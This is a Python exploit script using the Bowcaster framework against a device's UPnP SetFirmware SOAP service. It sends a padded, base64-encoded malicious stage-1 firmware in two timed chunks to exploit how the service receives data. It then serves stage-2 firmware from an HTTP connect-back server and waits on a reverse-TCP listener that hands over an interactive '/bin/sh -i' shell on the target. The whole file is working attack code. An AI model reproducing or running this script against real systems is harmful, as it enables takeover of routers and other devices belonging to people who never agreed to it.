#!/usr/bin/env python
import base64
import sys
import socket
import time
import os
import traceback
from bowcaster.common.support import LittleEndian
from bowcaster.development import OverflowBuffer
from bowcaster.common import Logging
from bowcaster.common.support import Logging
from bowcaster.servers.http_server import HTTPConnectbackServer
from bowcaster.servers import ConnectbackServer

from environment import TARGET
from environment import UPNP_PORT
from environment import HTTP_PORT
from environment import CONNECTBACK_PORT
from environment import STAGE1
from environment import STAGE2


class UPNPFirmwareExploit(object):
    def __init__(self,host,port,fw_stage1,logger=None):
        if not logger:
            logger=Logging(max_level=Logging.DEBUG)
        min_content_length=102401
        self.logger=logger
        self.host=host
        self.port=port
        firmware_data=open(fw_stage1,'rb').read()
        
        request=SetFirmwareRequest(str(firmware_data),min_content_length,logger=logger)
        self.request=request
        
    def send(self):
        self.__special_upnp_send()
    
    def __special_upnp_send(self):
        sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.connect((self.host,self.port))
        data=str(self.request)
        """only send first 8190 bytes of request"""
        self.logger.LOG_DEBUG("Sending first 8190 bytes to %s" % self.host)
        sock.send(data[:8190]) 
    
        """sleep to ensure first recv()
        only gets this first chunk."""
        self.logger.LOG_DEBUG("Sleeping.")
        time.sleep(1)
    
        """Hopefully in upnp_receiv_firmware_packets()
        by now, so we can send the rest."""
        self.logger.LOG_DEBUG("Sending remainder of request to %s" % self.host)
        sock.send(data[8190:])
    
        """
        Sleep a bit more so server doesn't end up
        in an infinite select() loop.
        Select's timeout is set to 1 sec,
        so we need to give enough time
        for the loop to go back to select,
        and for the timeout to happen,
        returning an error."""
        self.logger.LOG_DEBUG("Sleeping.")
        time.sleep(10)
        sock.close()
        self.logger.LOG_DEBUG("Done sending request.")

class SetFirmwareRequestHeaders(object):
    def __init__(self,content_length):
        headers="".join(["POST /soap/server_sa/SetFirmware HTTP/1.1\r\n",
                             "Accept-Encoding: identity\r\n",
                             "Content-Length: %d\r\n",
                             "Soapaction: \"urn:DeviceConfig\"\r\n",
                             "Host: 127.0.0.1\r\n",
                             "User-Agent: Python-urllib/2.7\r\n",
                             "Connection: close\r\n",
                             "Content-Type: text/xml ;charset=\"utf-8\"\r\n\r\n"])
         
        self.headers=headers % (content_length)
        
    def __str__(self):
        return self.headers

class SetFirmwareRequestBody(object):
    def __init__(self,firmware_data,min_content_length,logger=None):
        if not logger:
            logger=Logging(max_level=Logging.DEBUG)
        self.logger=logger
        logger.LOG_DEBUG("Building SetFirmware request body.")
        logger.LOG_DEBUG("Length of firmware: %d" % len(firmware_data))
        self.encoded_firmware=base64.b64encode(firmware_data)

        self.request_start="<SOAP-ENV:Body><NewFirmware>"
        self.request_end="</NewFirmware></SOAP-ENV:Body>"
        length=len(self.request_start)+len(self.request_end)+len(self.encoded_firmware)

        padding=""
        if length < min_content_length:
            print "Current length is %d" % length
            print "Generating %d As" %(min_content_length - length)
            padding="A"*(min_content_length - length)+"FOO"
        self.padding=padding


    
    def __len__(self):
        logger=self.logger
        return len(self.request_start)+len(self.encoded_firmware)+len(self.padding)+len(self.request_end)
        
    def __str__(self):
        return self.request_start+self.encoded_firmware+self.padding+self.request_end

class SetFirmwareRequest(object):
    def __init__(self,firmware_data,min_content_length=102401,logger=None):
        if not logger:
            logger=Logging(max_level=Logging.DEBUG)
        self.request_body=SetFirmwareRequestBody(firmware_data,min_content_length,logger=logger)
        length=len(self.request_body)
        # logger.LOG_DEBUG("Length of request body is: %d" % length)
        self.request_headers=SetFirmwareRequestHeaders(length)
    
    def __str__(self):
        return str(self.request_headers)+str(self.request_body)
        


def do_tcp_connectback(port,logger):
    server=None
    pid=None
    try:
        server=ConnectbackServer("0.0.0.0",port=port,startcmd="/bin/sh -i")
        pid=server.serve()
    except Exception as e:
        logger.LOG_WARN("Error starting server.")
        raise e
    return(server,pid)
    
def do_http_connectback(files_to_serve,port,docroot,logger):
    httpd=None
    pid=None
    try:
        logger.LOG_DEBUG("Starting server on port %d" % port)
        logger.LOG_DEBUG("Files to serve: %s" % str(files_to_serve))
        logger.LOG_DEBUG("Document root: %s" % docroot)
        httpd=HTTPConnectbackServer("",files_to_serve,port=port,docroot=docroot,logger=logger)
        pid=httpd.serve()
    except:
        logger.LOG_WARN("Error starting server.")
        sys.exit(1)
    return (httpd,pid)

def main(stage1,stage2,docroot):
    logger=Logging(max_level=Logging.DEBUG)
    
    """
    Start servers
    """
    try:
        logger.LOG_INFO("Starting HTTP connect-back server.")
        httpd,http_pid=do_http_connectback([stage2],HTTP_PORT,docroot,logger)
        logger.LOG_INFO("HTTP server started.")
    except Exception as e:
        print e
        sys.exit(1)

    try:
        logger.LOG_INFO("Starting reverse-tcp server.")
        connect_back,cb_pid=do_tcp_connectback(CONNECTBACK_PORT,logger)
        logger.LOG_INFO("Reverse-tcp server started.")
    except Exception as e:
        print e
        httpd.shutdown()
        sys.exit(1)
    
    """
    Exploit UPnP
    """
    try:
        logger.LOG_DEBUG("Instantiating UPnP firmware exploit.")
        exploit=UPNPFirmwareExploit(TARGET,UPNP_PORT,stage1,logger=logger)
        logger.LOG_INFO("Sending stage 1 firmware.")
        exploit.send()
        logger.LOG_INFO("Done with stage 1 firmware.")
    except Exception as e:
        print e
        traceback.print_exc()
        httpd.shutdown()
        connect_back.shutdown()
        raise e
        sys.exit(1)
    
    
    """
    Wait for servers to finish.
    """
    logger.LOG_INFO("Serving stage 2 firmware.")
    try:
        logger.LOG_INFO("Waiting for server to terminate. PID: %d" % http_pid)
        httpd.wait()
    except Exception as e:
        logger.LOG_WARN("Error with HTTP server: %s" % str(e))
        connect_back.shutdown()
        httpd.shutdown()
        #not sure if this is fatal or not.
        #We probably killed with ctrl+c
        sys.exit(1)
    
    logger.LOG_INFO("HTTP server terminated.")
    logger.LOG_INFO("Done serving with stage 2 firmware.")
    
    logger.LOG_INFO("Waiting for incoming remote shell.")
    try:
        logger.LOG_INFO("Waiting for reverse-tcp server to terminate.")
        connect_back.wait()
    except Exception as e:
        #pretty sure this happens when we ctrl+c during a reverse-tcp shell.
        logger.LOG_INFO("Shutting down reverse-tcp server.")
        connect_back.shutdown()
        httpd.shutdown()
    
    logger.LOG_INFO("Exploitation of %s complete." % TARGET)
    
    httpd.shutdown()
    connect_back.shutdown()
    sys.exit(0)
    
    
    
    
if __name__ == "__main__":
    docroot=sys.argv[1]
    stage1=docroot+STAGE1
    main(stage1,STAGE2,docroot)

    
